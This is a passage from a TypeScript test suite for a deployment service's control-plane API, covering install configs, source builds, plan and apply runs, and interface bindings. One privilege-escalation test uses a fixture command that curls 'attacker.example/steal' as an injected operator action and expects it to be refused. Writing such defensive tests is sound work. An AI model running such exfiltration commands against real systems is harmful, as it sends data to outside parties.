    sourceUrl: "https://git.example.com/example/source-build.git",
  });
  const digest = `sha256:${"e".repeat(64)}`;
  const reviewedSourceBuild: SourceBuildConfig = {
    commands: [
      { argv: ["bun", "run", "build", "--reviewed"] },
    ],
    outputs: ["dist/reviewed.js"],
  };
  const changedSourceBuild: SourceBuildConfig = {
    commands: [{ argv: ["bun", "run", "build", "--changed"] }],
    outputs: ["dist/changed.js"],
  };
  const manifestWithSourceBuild = (sourceBuild: SourceBuildConfig) => ({
    status: "present" as const,
    digest,
    document: {
      apiVersion: "takosumi.com/v2.3" as const,
      kind: "Repository" as const,
      install: {
        defaultModule: ".",
        modules: {
          ".": {
            inputs: [],
            sourceBuild,
          },
        },
      },
    },
  });
  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: manifestWithSourceBuild(reviewedSourceBuild),
  });

  const preview = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "source-build-pin",
        compileInstallUx: true,
      },
    },
    201,
  );
  const reviewedConfig = await operations.capsules.getInstallConfig(
    preview.repositoryInstallUx.installConfigId,
  );
  expect(reviewedConfig.sourceBuild).toEqual(reviewedSourceBuild);
  const adoptionOnlyConfig = await operations.capsules.putInstallConfig({
    ...reviewedConfig,
    id: "icfg_repo_source_build_adoption_only",
    name: "source-build-adoption-only",
    sourceBuild: undefined,
  });

  const created = await controlJson<{
    readonly capsule: { readonly id: string; readonly installConfigId: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "source-build-pin",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: adoptionOnlyConfig.id,
      },
    },
    201,
  );
  const capsuleConfig = await operations.capsules.getInstallConfig(
    created.capsule.installConfigId,
  );
  expect(capsuleConfig.sourceBuild).toEqual(reviewedSourceBuild);

  // Keep the captured manifest digest stable while changing its proposal. A
  // subsequent Plan must use the DB-owned InstallConfig, not recompile this
  // changed repository metadata.
  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: manifestWithSourceBuild(changedSourceBuild),
  });
  const planBody = await controlJson<{
    readonly run: { readonly id: string; readonly status: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/capsules/${created.capsule.id}/plan`,
    },
    201,
  );
  expect(planBody.run.status).toBe("succeeded");
  expect(runner.planJobs[0]?.sourceBuild).toEqual(reviewedSourceBuild);

  const applyBody = await controlJson<{
    readonly run: { readonly status: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/runs/${planBody.run.id}/apply`,
    },
    201,
  );
  expect(applyBody.run.status).toBe("succeeded");
  expect(runner.applyJobs[0]?.sourceBuild).toEqual(reviewedSourceBuild);
});

test("a Workspace session cannot grant itself operator lifecycle actions through the Capsule config patch", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
  });
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_lifecycle_escalation",
    capsuleId: "cap_lifecycle_esc",
    installConfigId: "icfg_lifecycle00001",
    installConfig: {
      workspaceId: "ws_lifecycle_escalation",
      internal: { reason: "per_install_overrides" },
      policy: {
        lifecycleActions: {
          allowedExecutors: ["runner"],
          allowedRunnerCapabilities: ["capsule.lifecycle.command.v1"],
        },
      },
    },
  });

  // PATCH /api/v1/capsule-configs/:id is gated only by active Workspace
  // membership, and an `operator` action is executed by the operator's own
  // release-activation webhook. Widening the policy in the same patch that
  // installs the action must not be self-authorizing.
  const built = request(
    "PATCH",
    `/api/v1/capsule-configs/${seeded.installConfig.id}`,
    {
      cookie,
      body: {
        lifecycleActions: [
          {
            apiVersion: "takosumi.dev/v1alpha1",
            kind: "command",
            id: "activate",
            phase: "post_apply",
            executor: "operator",
            command: ["curl", "https://attacker.example/steal"],
            runnerCapability: "capsule.lifecycle.command.v1",
          },
        ],
        lifecycleActionPolicy: {
          allowedExecutors: ["runner", "operator"],
          allowedRunnerCapabilities: ["capsule.lifecycle.command.v1"],
        },
      },
    },
  );
  const response = await handleControlRoute({
    request: built.request,
    url: built.url,
    store: accountStore,
    operations,
  });

  expect(response?.status).toEqual(403);
  const stored = await operations.capsules.getInstallConfig(
    seeded.installConfig.id,
  );
  expect(stored.lifecycleActions).toBeUndefined();
  expect(stored.policy.lifecycleActions?.allowedExecutors).toEqual(["runner"]);
});

test("a Capsule config patch cannot drop the public_endpoint projection that reserves the hostname", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
  });
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_public_endpoint",
    capsuleId: "cap_public_endpoint",
    installConfigId: "icfg_publicendpoint",
    installConfig: {
      workspaceId: "ws_public_endpoint",
      internal: { reason: "per_install_overrides" },
      variableMapping: { app_url: "https://mine.app.takosumi.test" },
      installExperience: {
        projections: [
          {
            kind: "public_endpoint",
            variables: { url: "app_url" },
          },
        ],
      },
    },
  });

  // Erasing the projection while keeping the endpoint variable would make the
  // plan skip host reservation entirely and let `app_url` name someone else's
  // host — `installExperienceValue({})` parses, so this must be rejected here.
  const built = request(
    "PATCH",
    `/api/v1/capsule-configs/${seeded.installConfig.id}`,
    {
      cookie,
      body: {
        installExperience: {},
        variableMapping: { app_url: "https://victim.app.takosumi.test" },
      },
    },
  );
  const response = await handleControlRoute({
    request: built.request,
    url: built.url,
    store: accountStore,
    operations,
  });

  expect(response?.status).toEqual(400);
  const stored = await operations.capsules.getInstallConfig(
    seeded.installConfig.id,
  );
  expect(stored.installExperience?.projections).toEqual([
    { kind: "public_endpoint", variables: { url: "app_url" } },
  ]);
  expect(stored.variableMapping.app_url).toBe("https://mine.app.takosumi.test");
});

test("account session control routes execute plan and apply through the real OpenTofu controller", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const runner = recordingRunner();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: runner,
    opentofuConnectionVault: fakeProviderVault() as never,
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
  });

  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_route_e2e",
    capsuleId: "cap_route_e2e",
    environment: "preview",
    installConfig: storeEligibleInstallConfig(
      "https://git.example.com/example/app.git",
    ),
  });
  await seedProviderConnections(deployStore, seeded.capsule);
  const installUxDigest = `sha256:${"d".repeat(64)}`;
  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "present",
      digest: installUxDigest,
      document: {
        apiVersion: "takosumi.com/v1",
        kind: "Repository",
        install: { modules: { ".": { inputs: [] } } },
      },
    },
  });

  const sourceSnapshots = await controlJson<{
    readonly snapshots: readonly {
      readonly repositoryManifest?: unknown;
    }[];
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "GET",
      path: `/api/v1/sources/${seeded.source.id}/snapshots`,
    },
    200,
  );
  expect(sourceSnapshots.snapshots[0]?.repositoryManifest).toEqual({
    status: "present",
    digest: installUxDigest,
  });
  expect(JSON.stringify(sourceSnapshots)).not.toContain('"document"');

  const stableTag = await controlJson<{
    readonly tag: string;
    readonly commit: string;
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/source-ref-resolutions/stable-semver`,
      body: { url: "https://github.com/example/options.git" },
    },
    200,
  );
  expect(stableTag).toEqual({
    tag: "v2.4.0",
    commit: "1234567890abcdef1234567890abcdef12345678",
  });
  expect(runner.stableTagJobs).toHaveLength(1);

  const presentationFile = await controlJson<{
    readonly sourceSnapshotId: string;
    readonly path: string;
    readonly digest: string;
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "GET",
      path: `/api/v1/sources/${seeded.source.id}/snapshots/${seeded.snapshot.id}/file?path=install%2Foptions.json`,
    },
    200,
  );
  expect(presentationFile).toMatchObject({
    sourceSnapshotId: seeded.snapshot.id,
    path: "install/options.json",
    digest:
      "sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
  });
  expect(runner.presentationFileJobs).toHaveLength(1);

  await controlJson(
    {
      operations,
      store: accountStore,
      cookie,
      method: "GET",
      path: `/api/v1/sources/${seeded.source.id}/snapshots/${seeded.snapshot.id}/file?path=.well-known%2Ftakosumi.json`,
    },
    400,
  );
  expect(runner.presentationFileJobs).toHaveLength(1);

  const installUxPreview = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "route-preview",
        compileInstallUx: true,
      },
    },
    201,
  );
  expect(installUxPreview.repositoryInstallUx.status).toBe("accepted");
  const previewConfig = await operations.capsules.getInstallConfig(
    installUxPreview.repositoryInstallUx.installConfigId,
  );
  expect(previewConfig.installExperience?.repositoryInstallUx).toEqual({
    status: "accepted",
  });
  expect(previewConfig.internal).toMatchObject({
    reason: "per_install_overrides",
    sourceSnapshotId: seeded.snapshot.id,
    repositoryInstallUxDigest: installUxDigest,
  });
  await controlJson(
    {
      operations,
      store: accountStore,
      cookie,
      method: "PATCH",
      path: `/api/v1/capsule-configs/${previewConfig.id}`,
      body: {
        variableMapping: { unreviewed_value: "must-not-be-adopted" },
      },
    },
    409,
  );
  expect(
    (await operations.capsules.getInstallConfig(previewConfig.id))
      .variableMapping,
  ).not.toHaveProperty("unreviewed_value");

  const repeatedInstallUxPreview = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "route-preview",
        compileInstallUx: true,
      },
    },
    201,
  );
  expect(repeatedInstallUxPreview.repositoryInstallUx.installConfigId).toBe(
    installUxPreview.repositoryInstallUx.installConfigId,
  );

  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "invalid",
      reason: "invalid_document",
      diagnostic: "bounded fixture diagnostic",
    },
  });
  const invalidInstallUxPreview = await controlJson<{
    readonly error: {
      readonly code: string;
      readonly message: string;
      readonly details?: { readonly diagnosticCode?: string };
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "route-preview",
        compileInstallUx: true,
      },
    },
    400,
  );
  expect(invalidInstallUxPreview.error).toMatchObject({
    code: "repository_install_ux_invalid",
    details: {
      diagnosticCode: "repository_install_ux_document_invalid",
    },
  });
  expect(JSON.stringify(invalidInstallUxPreview)).not.toContain(
    "bounded fixture diagnostic",
  );
  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "present",
      digest: installUxDigest,
      document: {
        apiVersion: "takosumi.com/v1",
        kind: "Repository",
        install: { modules: { ".": { inputs: [] } } },
      },
    },
  });

  const planBody = await controlJson<{
    readonly run: {
      readonly id: string;
      readonly status: string;
      readonly planDigest?: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/capsules/${seeded.capsule.id}/plan`,
    },
    201,
  );
  expect(planBody.run.status).toEqual("succeeded");
  expect(planBody.run.planDigest).toEqual(PLAN_DIGEST);
  expect(runner.planJobs).toHaveLength(1);
  expect(runner.planJobs[0]!.sourceArchive).toEqual({
    ref: "workspaces/ws_route_e2e/sources/src_fixture/snapshots/snap_fixture/source.tar.zst",
    digest: FIXTURE_ARCHIVE_DIGEST,
  });
  expect(runner.planJobs[0]!.stateScope).toMatchObject({
    workspaceId: "ws_route_e2e",
    environment: "preview",
    generation: 0,
    subject: { kind: "capsule", id: seeded.capsule.id },
  });

  const applyBody = await controlJson<{
    readonly run: { readonly id: string; readonly status: string };
    readonly capsule?: {
      readonly id: string;
      readonly status: string;
      readonly currentStateGeneration?: number;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/runs/${planBody.run.id}/apply`,
    },
    201,
  );
  expect(applyBody.run.status).toEqual("succeeded");
  expect(applyBody.capsule).toMatchObject({
    id: seeded.capsule.id,
    status: "active",
    currentStateGeneration: 1,
  });
  expect("stateVersion" in applyBody).toBe(false);
  expect(JSON.stringify(applyBody)).not.toContain("launch_url");
  expect(JSON.stringify(applyBody)).not.toContain("secret-output-token");
  expect(runner.applyJobs).toHaveLength(1);
  expect(runner.applyJobs[0]!.planRun.id).toEqual(planBody.run.id);
  expect(runner.applyJobs[0]!.stateScope).toMatchObject({
    workspaceId: "ws_route_e2e",
    environment: "preview",
    generation: 1,
    subject: { kind: "capsule", id: seeded.capsule.id },
  });

  const runBody = await controlJson<{
    readonly run: {
      readonly id: string;
      readonly capsuleId?: string;
      readonly status: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "GET",
      path: `/api/v1/runs/${applyBody.run.id}`,
    },
    200,
  );
  expect(runBody.run).toMatchObject({
    id: applyBody.run.id,
    capsuleId: seeded.capsule.id,
    status: "succeeded",
  });
});

test("authenticated repository Interface review persists exact proposals and apply materializes only requested bindings", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const runner = recordingRunner();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: runner,
    opentofuConnectionVault: fakeProviderVault() as never,
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
  });
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_repo_interface_e2e",
    capsuleId: "cap_repo_interface_seed",
    installConfigId: "icfg_repo_interface_base",
    name: "seed",
    installConfig: {
      ...storeEligibleInstallConfig(
        "https://git.example.com/example/app.git",
      ),
      outputAllowlist: {},
      policy: {
        repositoryInstallUx: {
          allowedInterfacePermissions: ["ui.open"],
        },
      },
    },
  });
  const repositoryManifestDigest = `sha256:${"e".repeat(64)}`;
  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "present",
      digest: repositoryManifestDigest,
      document: REPOSITORY_INTERFACE_MANIFEST,
    },
  });

  const unauthenticatedPreviewRequest = request(
    "POST",
    `/api/v1/sources/${seeded.source.id}/compatibility-check`,
    {
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "repo-interface",
        compileInstallUx: true,
      },
    },
  );
  const unauthenticatedPreview = await handleControlRoute({
    request: unauthenticatedPreviewRequest.request,
    url: unauthenticatedPreviewRequest.url,
    store: accountStore,
    operations,
  });
  expect(unauthenticatedPreview?.status).toBe(401);

  const preview = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "repo-interface",
        compileInstallUx: true,
      },
    },
    201,
  );
  const previewConfig = await operations.capsules.getInstallConfig(
    preview.repositoryInstallUx.installConfigId,
  );
  expect(previewConfig.workspaceId).toBe(seeded.workspace.id);
  expect(previewConfig.outputAllowlist).toEqual({
    launch_url: { from: "launch_url", type: "url", required: true },
  });
  expect(previewConfig.interfaceBlueprints).toEqual([
    {
      key: "launcher",
      name: "app.launcher",
      spec: {
        type: "interface.ui.surface",
        version: "1",
        document: {
          display: { title: "Open app" },
          launcher: true,
        },
        inputs: {
          url: { source: "capsule_output", outputName: "launch_url" },
        },
        access: {
          visibility: "workspace",
          resourceUriInput: "url",
        },
      },
      bindings: [
        {
          key: "installer",
          subjectRef: { kind: "Principal", id: "user_test" },
          permissions: ["ui.open"],
          delivery: { type: "none" },
        },
      ],
    },
    {
      key: "unbound-status",
      name: "app.unbound-status",
      spec: {
        type: "example.status",
        version: "1",
        document: { purpose: "binding-negative-control" },
        inputs: {
          state: { source: "literal", value: "available" },
        },
        access: { visibility: "workspace" },
      },
    },
  ]);

  const moduleOverride = await controlJson<{
    readonly error: {
      readonly code: string;
      readonly details?: { readonly diagnosticCode?: string };
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-interface-module-override",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: previewConfig.id,
        modulePath: "deploy/override",
      },
    },
    400,
  );
  expect(moduleOverride.error).toMatchObject({
    code: "repository_install_ux_invalid",
    details: {
      diagnosticCode: "repository_install_ux_module_path_mismatch",
    },
  });
  expect(
    (await operations.capsules.listCapsules(seeded.workspace.id)).some(
      (entry) => entry.name === "repo-interface-module-override",
    ),
  ).toBe(false);

  const matchingModule = await controlJson<{
    readonly capsule: { readonly id: string; readonly installConfigId: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-interface-module-match",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: previewConfig.id,
        modulePath: ".",
      },
    },
    201,
  );
  const matchingConfig = await operations.capsules.getInstallConfig(
    matchingModule.capsule.installConfigId,
  );
  expect(matchingConfig.modulePath).toBe(previewConfig.modulePath);

  const otherCookie = seedSession(accountStore, "user_other");
  await operations.members.upsertMember({
    workspaceId: seeded.workspace.id,
    accountId: "user_other",
    roles: ["admin"],
    status: "active",
    actor: {
      actorAccountId: "user_test",
      roles: ["owner"],
      requestId: "req_repo_interface_other_member",
    },
  });
  const principalConflict = await controlJson<{
    readonly error: {
      readonly code: string;
      readonly details?: { readonly diagnosticCode?: string };
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie: otherCookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-interface-other-installer",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: previewConfig.id,
      },
    },
    400,
  );
  expect(principalConflict.error).toMatchObject({
    code: "repository_install_ux_invalid",
    details: {
      diagnosticCode: "repository_install_ux_interface_blueprint_conflict",
    },
  });
  expect(
    (await operations.capsules.listCapsules(seeded.workspace.id)).some(
      (entry) => entry.name === "repo-interface-other-installer",
    ),
  ).toBe(false);

  const created = await controlJson<{
    readonly capsule: { readonly id: string; readonly installConfigId: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-interface",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: previewConfig.id,
      },
    },
    201,
  );
  expect(created.capsule.installConfigId).not.toBe(previewConfig.id);
  const scopedConfig = await operations.capsules.getInstallConfig(
    created.capsule.installConfigId,
  );
  expect(scopedConfig.workspaceId).toBe(seeded.workspace.id);
  expect(scopedConfig.outputAllowlist).toEqual(previewConfig.outputAllowlist);
  expect(scopedConfig.interfaceBlueprints?.[0]?.bindings).toEqual([
    {
      key: "installer",
      subjectRef: { kind: "Principal", id: "user_test" },
      permissions: ["ui.open"],
      delivery: { type: "none" },
    },
  ]);
  expect(JSON.stringify(scopedConfig.interfaceBlueprints)).not.toContain(
    "credentialRef",
  );
  expect(JSON.stringify(scopedConfig.interfaceBlueprints)).not.toContain(
    '"options"',
  );

  const capsule = await operations.capsules.getCapsule(created.capsule.id);
  await seedProviderConnections(deployStore, capsule);
  const plan = await controlJson<{
    readonly run: { readonly id: string; readonly status: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/capsules/${capsule.id}/plan`,
    },
    201,
  );
  expect(plan.run.status).toBe("succeeded");
  const apply = await controlJson<{
    readonly run: { readonly id: string; readonly status: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/runs/${plan.run.id}/apply`,
    },
    201,
  );
  expect(apply.run.status).toBe("succeeded");

  const interfaces = await operations.interfaces.list({
    workspaceId: seeded.workspace.id,
    ownerKind: "Capsule",
    ownerId: capsule.id,
  });
  expect(interfaces).toHaveLength(2);
  const launcher = interfaces.find(
    (entry) =>
      entry.metadata.materializedFrom?.source === "capsule_blueprint" &&
      entry.metadata.materializedFrom.key === "launcher",
  );
  expect(launcher).toMatchObject({
    metadata: {
      workspaceId: seeded.workspace.id,
      ownerRef: { kind: "Capsule", id: capsule.id },
    },
    spec: {
      type: "interface.ui.surface",
      inputs: {
        url: {
          source: "capsule_output",
          capsuleId: capsule.id,
          outputName: "launch_url",
        },
      },
    },
    status: {
      phase: "Resolved",
      resolvedInputs: { url: "https://hello.takosumi.test" },
    },
  });
  expect(
    await operations.interfaces.listBindings(launcher!.metadata.id),
  ).toEqual([
    expect.objectContaining({
      spec: {
        interfaceId: launcher!.metadata.id,
        subjectRef: { kind: "Principal", id: "user_test" },
        permissions: ["ui.open"],
        delivery: { type: "none" },
      },
      status: expect.objectContaining({ phase: "Ready" }),
    }),
  ]);
  const unbound = interfaces.find(
    (entry) =>
      entry.metadata.materializedFrom?.source === "capsule_blueprint" &&
      entry.metadata.materializedFrom.key === "unbound-status",
  );
  expect(unbound?.status).toMatchObject({
    phase: "Resolved",
    resolvedInputs: { state: "available" },
  });
  expect(
    await operations.interfaces.listBindings(unbound!.metadata.id),
  ).toEqual([]);

  await operations.capsules.putInstallConfig({
    ...seeded.installConfig,
    id: "icfg_repo_interface_conflict",
    interfaceBlueprints: [
      {
        ...previewConfig.interfaceBlueprints![0]!,
        spec: {
          ...previewConfig.interfaceBlueprints![0]!.spec,
          document: { launcher: false },
        },
      },
    ],
  });
  const conflict = await controlJson<{
    readonly error: {
      readonly code: string;
      readonly details?: { readonly diagnosticCode?: string };
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-interface-conflict",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: "icfg_repo_interface_conflict",
      },
    },
    400,
  );
  expect(conflict.error).toMatchObject({
    code: "repository_install_ux_invalid",
    details: {
      diagnosticCode: "repository_install_ux_interface_blueprint_conflict",
    },
  });
  expect(
    (await operations.capsules.listCapsules(seeded.workspace.id)).some(
      (entry) => entry.name === "repo-interface-conflict",
    ),
  ).toBe(false);
});
